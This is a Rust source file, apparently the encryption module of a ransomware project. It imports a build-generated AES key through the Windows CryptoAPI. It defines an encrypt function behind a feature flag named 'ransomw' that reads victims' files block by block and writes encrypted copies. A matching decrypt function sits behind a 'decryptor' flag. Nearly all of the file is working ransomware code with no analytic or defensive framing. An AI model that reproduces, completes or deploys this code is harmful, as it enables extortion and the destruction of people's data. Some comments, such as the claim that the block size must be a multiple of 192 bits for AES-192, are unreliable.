// ==========================================================================// 
//                               ENCRYPTION.RS                               // 
// ==========================================================================// 

// ======================= ENCRYPTION KEY ======================
include!("generated_key.rs"); // build.rs generates encryption keys here

// ======================= GENERAL IMPORTS ======================
extern crate winapi;

use std::ffi::CString;
use std::ptr::null_mut;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileA, ReadFile, WriteFile, OPEN_ALWAYS, OPEN_EXISTING};
use winapi::um::handleapi::CloseHandle;
use winapi::um::winnt::{FILE_ATTRIBUTE_NORMAL, FILE_READ_DATA, FILE_SHARE_READ, FILE_WRITE_DATA, HANDLE};

// ======================= RANSOMWARE IMPORTS ======================
#[cfg(feature = "ransomw")]
use winapi::um::winnt::DELETE;

#[cfg(feature = "ransomw")]
use std::ffi::CStr;

#[cfg(feature = "ransomw")]
use winapi::um::wincrypt::{
    CryptAcquireContextA, CryptDestroyKey, CryptEncrypt, CryptImportKey, HCRYPTKEY, HCRYPTPROV, PROV_RSA_AES,CryptReleaseContext,CRYPT_VERIFYCONTEXT
};

// ======================= DECRYPTOR IMPORTS =======================
#[cfg(feature = "decryptor")]
use winapi::um::wincrypt::{
    CryptAcquireContextA, CryptDecrypt, CryptDestroyKey, CryptImportKey, HCRYPTKEY, HCRYPTPROV, PROV_RSA_AES,CryptReleaseContext,CRYPT_VERIFYCONTEXT
};

// ======================= ENCRYPTION =======================
// Function to encrypt a file.
#[cfg(feature = "ransomw")]
pub fn encrypt(source_file: CString, dest_file: CString) -> bool {
    // Initializes variables for the key and the cryptographic provider.
    let mut h_key: HCRYPTKEY = 0usize;
    let mut h_crypt_prov: HCRYPTPROV = 0usize;

    unsafe {
        // Acquires a cryptographic context.
        if CryptAcquireContextA(
            &mut h_crypt_prov,
            null_mut(),
            null_mut(),
            PROV_RSA_AES,
            CRYPT_VERIFYCONTEXT,
        ) == 0
        {
            // If it fails, prints the error code.
            println!(
                "Error during CryptAcquireContext! Error code: {}",
                GetLastError()
            );
            return false;
        } else {
            println!("A cryptographic provider has been acquired.");
        }

        // Imports the AES key.
        if CryptImportKey(
            h_crypt_prov,
            GENERATED_KEY.as_ptr(),
            GENERATED_KEY.len() as u32,
            0,
            0,
            &mut h_key,
        ) == 0
        {
            // If the import fails, prints the error code.
            println!("Failed to import {:?}", GetLastError());
            return false;
        } else {
            println!("Import successful. The key is 0x{:x}", h_key);
        }

        // Determines the number of bytes to encrypt at each iteration.
        // Must be a multiple of 192 due to using AES-192.
        let block_len: u32 = 960;
        let buffer_len: u32 = 960;

        // Allocates memory for the buffer.
        let mut pb_buffer: Vec<u8> = Vec::new();
        pb_buffer.resize(buffer_len as usize, 0u8);
        println!("Memory has been allocated for the buffer.");

        // Opens the source file for reading.
        let source_handle: HANDLE = CreateFileA(
            source_file.as_ptr(),
            FILE_READ_DATA,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        // Opens the destination file for writing.
        let dest_handle: HANDLE = CreateFileA(
            dest_file.as_ptr(),
            FILE_WRITE_DATA | DELETE,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        let mut eof = 0; // End-of-file indicator.
        let mut count = 0; // Bytes read or written counter.

        // Loop to read, encrypt, and write the file.
        while eof == 0 {
            // Reads from the source file.
            if ReadFile(
                source_handle,
                pb_buffer.as_ptr() as *mut _,
                block_len,
                &mut count,
                null_mut(),
            ) == 0
            {
                let c_str: &CStr = &source_file;

                // Attempt to convert &CStr to &str
                match c_str.to_str() {
                    Ok(str_slice) => println!("Converted CString to str: {}", str_slice),
                    Err(e) => eprintln!("Failed to convert CString to str: {:?}", e),
                }
                println!("Error reading");
                break;
            }
            // If less than expected is read, indicates end of file.
            if count < block_len {
                eof = 1;
            }

            // Encrypts the read content.
            if CryptEncrypt(
                h_key,
                0,
                eof,
                0,
                pb_buffer.as_ptr() as *mut u8,
                &mut count,
                buffer_len,
            ) == 0
            {
                println!("Failed to encrypt 0x{:x}", GetLastError());
                break;
            }

            // Writes the encrypted content to the destination file.
            if WriteFile(
                dest_handle,
                pb_buffer.as_ptr() as *const _,
                count,
                &mut count,
                null_mut(),
            ) == 0
            {
                println!("Failed to write");
                break;
            }
        }
        // Closes the HANDLEs and releases resources.
        CloseHandle(source_handle);
        CloseHandle(dest_handle);
        CryptDestroyKey(h_key);
        CryptReleaseContext(h_crypt_prov, 0);
    }
    true // Returns true if the entire process was successful.
}

// ======================= DECRYPTION =======================
// Function to decrypt a file.
#[cfg(feature = "decryptor")]
pub fn decrypt(source_file: CString, dest_file: CString) -> bool {
    let mut h_key: HCRYPTKEY = 0usize; // key
    let mut h_crypt_prov: HCRYPTPROV = 0usize;
    unsafe {
        if CryptAcquireContextA(
            &mut h_crypt_prov,
            null_mut(),
            null_mut(),
            PROV_RSA_AES,
            CRYPT_VERIFYCONTEXT,
        ) == 0
        {
            println!("Error during CryptAcquireContext!");
            println!("Error code: {}", GetLastError());
            return false;
        } else {
            println!("A cryptographic provider has been acquired.");
        }

        if CryptImportKey(
            h_crypt_prov,
            GENERATED_KEY.as_ptr(),
            GENERATED_KEY.len() as u32,
            0,
            0,
            &mut h_key,
        ) == 0
        {
            println!("Import fail {:?}", GetLastError());
            return false;
        } else {
            println!("Import successful. Key is {}", h_key);
        }

        let src_handle: HANDLE = CreateFileA(
            source_file.as_ptr(),
            FILE_READ_DATA,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        let dest_handle: HANDLE = CreateFileA(
            dest_file.as_ptr(),
            FILE_WRITE_DATA,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        let block_len: u32 = 960;
        let buffer_len: u32 = 960;

        let mut eof = 0;
        let mut count = 0;

        let mut pb_buffer: Vec<u8> = Vec::new();
        pb_buffer.resize(buffer_len as usize, 0u8);

        while eof == 0 {
            if ReadFile(
                src_handle,
                pb_buffer.as_ptr() as *mut _,
                block_len,
                &mut count,
                null_mut(),
            ) == 0
            {
                println!("Error reading 0x{:x}", GetLastError());
                break;
            }
            
            if count < block_len {
                eof = 1;
            }

            if CryptDecrypt(h_key, 0, eof, 0, pb_buffer.as_mut_ptr(), &mut count) == 0 {
                println!("Fail to decrypt 0x{:x}", GetLastError());
                break;
            }

            if WriteFile(
                dest_handle,
                pb_buffer.as_ptr() as *const _,
                count,
                &mut count,
                null_mut(),
            ) == 0
            {
                println!("Fail to write");
                break;
            }
        }
        CryptDestroyKey(h_key);
        CryptReleaseContext(h_crypt_prov, 0);
        CloseHandle(src_handle);
        CloseHandle(dest_handle);
    }
    true
}
